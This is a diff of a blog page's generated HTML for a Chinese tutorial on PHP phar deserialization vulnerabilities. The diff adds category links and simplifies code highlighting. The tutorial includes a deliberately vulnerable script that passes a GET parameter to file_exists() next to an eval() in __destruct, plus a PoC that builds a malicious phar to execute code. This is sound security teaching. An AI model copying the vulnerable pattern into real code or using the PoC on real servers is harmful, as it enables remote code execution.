@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                    <b>#</b> PHP漏洞
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -188,23 +209,23 @@
 <span id="more"></span>
 
 <h2 id="基础知识：序列化的属性权限问题"><a href="#基础知识：序列化的属性权限问题" class="headerlink" title="基础知识：序列化的属性权限问题"></a>基础知识：序列化的属性权限问题</h2><p>php在使用serialize()的时候产生的数据会根据attribute的权限不同，产生不同的数据和长度。</p>
-<h3 id="private类型"><a href="#private类型" class="headerlink" title="private类型"></a>private类型</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'bad'</span><span class="token punctuation">;</span><span class="token comment">//此处我们将flag设为private类型</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_flag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
+<h3 id="private类型"><a href="#private类型" class="headerlink" title="private类型"></a>private类型</h3><pre><code class="php">&lt;?php
+class test&#123;
+    private $flag = &#39;bad&#39;;//此处我们将flag设为private类型
+    public function set_flag($flag)&#123;
+    $this-&gt;flag=$flag;
+    &#125;
+    public function get_flag()&#123;
+        return $this-&gt;flag;
+    &#125;
+&#125;
 
-<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$object</span><span class="token operator">-></span><span class="token function">set_flag</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'good'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//序列化这个object</span>
-<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//把结果打出来</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+$object = new test();
+$object-&gt;set_flag(&#39;good&#39;);
+$data = serialize($object);//序列化这个object
+echo $data;//把结果打出来
+?&gt;
+</code></pre>
 <p>观察发现打出来的结果是：<code>O:4:&quot;test&quot;:1:&#123;s:10:&quot;testflag&quot;;s:6:&quot;Active&quot;;&#125;</code></p>
 <p>此处代表属性名的testflag长度实际只有8，为什么却打出来有10个呢。这是因为他生成的格式是==%00类名%00属性名==</p>
 <h3 id="protected类型"><a href="#protected类型" class="headerlink" title="protected类型"></a>protected类型</h3><p>生成格式为==%00*%00属性名==</p>
@@ -245,10 +266,10 @@
 <li><p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708105320550.png" alt="image-20210708105320550"></p>
 </li>
 <li><p>只要是函数的实现过程间接或直接调用了php_stream_open_wrapper都可能触发phar反序列化漏洞</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">exif_thumbnail
+<pre><code class="php">exif_thumbnail
 exif_imagetype
 imageloadfont
-imagecreatefrom<span class="token operator">**</span><span class="token operator">*</span>
+imagecreatefrom***
 hash_hmac_file
 hash_file
 hash_update_file
@@ -257,10 +278,12 @@ sha1_file
 get_meta_tags
 get_headers
 getimagesize
-<span class="token class-name type-declaration">getimagesizefromstring</span>
-<span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+getimagesizefromstring
+$zip = new ZipArchive();
+$res = $zip-&gt;open(&#39;c.zip&#39;);
+$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);
+</code></pre>
+</li>
 <li><p>除了以上还有很多函数可能触发，更多的参见<a target="_blank" rel="noopener" href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">另一位师父的关于phar反序列化的文章</a></p>
 </li>
 </ul>
@@ -274,54 +297,54 @@ getimagesize
 <p>在网上看见有师父提到linux环境下：</p>
 <p><code>如果是linux环境下，需要在 /etc/php/7.0/apache2/php.ini 和/etc/php/7.0/cli/php.ini 这两个文件都需要修改 phar.readonly 否则不能生成phar文件</code></p>
 <p>我本人用的是mac系统,在etc/private/php.ini直接修改即可。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-<span class="token punctuation">&#125;</span>
-@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成的文件后缀名必须为phar</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php xxx; __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub</span>
-<span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义的object传入meta-data里</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phartest.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">&lt;?php
+class MyClass&#123;
+&#125;
+@unlink(&quot;phar.phar&quot;);
+$phar =new Phar(&quot;phar.phar&quot;);//生成的文件后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php xxx; __HALT_COMPILER();?&gt;&quot;);//设置stub
+$o=new MyClass();
+$phar-&gt;setMetadata($o);//将自定义的object传入meta-data里
+$phar-&gt;addFromString(&quot;phartest.txt&quot;,&quot;test&quot;);//添加要压缩的文件
+$phar-&gt;stopBuffering();
+</code></pre>
 <p><strong>踩了一个坑：</strong></p>
 <p>代码写好后，有一个坑，就是我直接运行浏览器运行php是不行的（提示500错误），研究以后猜测是权限问题，因为我的网站是搭建在library目录下的，后来改用命令行在<code>vscode</code>里运行提示也<code>permission denied</code>,加上<code>sudo</code>就好了。</p>
 <h2 id="phar反序列化漏洞利用实例"><a href="#phar反序列化漏洞利用实例" class="headerlink" title="phar反序列化漏洞利用实例"></a>phar反序列化漏洞利用实例</h2><p><strong>漏洞代码：</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//检测是否有名为filename的get请求</span>
-    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取该请求并赋值给filename</span>
-    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span><span class="token comment">//可以利用的class</span>
-        <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string single-quoted-string">'echo "hahaha";'</span><span class="token punctuation">;</span>
-        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//可以利用的魔术方法</span>
-        <span class="token punctuation">&#123;</span>
-            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里eval会执行output的内容</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以利用的文件操作函数</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">&lt;?php
+if(isset($_GET[&#39;filename&#39;]))&#123;//检测是否有名为filename的get请求
+    $filename=$_GET[&#39;filename&#39;];//获取该请求并赋值给filename
+    class MyClass&#123;//可以利用的class
+        var $output=&#39;echo &quot;hahaha&quot;;&#39;;
+        function __destruct()//可以利用的魔术方法
+        &#123;
+            eval($this-&gt;output);//这里eval会执行output的内容
+        &#125;
+    &#125;
+    file_exists($filename);//可以利用的文件操作函数
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
 <p><strong>POC:</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span> <span class="token punctuation">&#123;</span><span class="token comment">//要利用的class</span>
-        <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span> <span class="token comment">//我们只需要覆写output这个attribute的值</span>
-    <span class="token punctuation">&#125;</span>
+<pre><code class="php">&lt;?php
+    class MyClass &#123;//要利用的class
+        var $output=&#39;phpinfo();&#39;; //我们只需要覆写output这个attribute的值
+    &#125;
 
-    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除已存在的test.phar</span>
-    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
-    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
-    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
-    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
-    <span class="token comment">//签名自动计算</span>
-    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    @unlink(&quot;test.phar&quot;);//删除已存在的test.phar
+    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new MyClass();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
 <p><strong>实现：在get请求中采用phar://你的文件.phar的格式，成功执行代码</strong></p>
 <p><img src="/image/php%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20210708162848044.png" alt="image-20210708162848044"></p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>感谢<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">K0rz3n大牛的php反序列化文章</a></p>
@@ -344,6 +367,23 @@ getimagesize
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                        <b>#</b> PHP漏洞
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
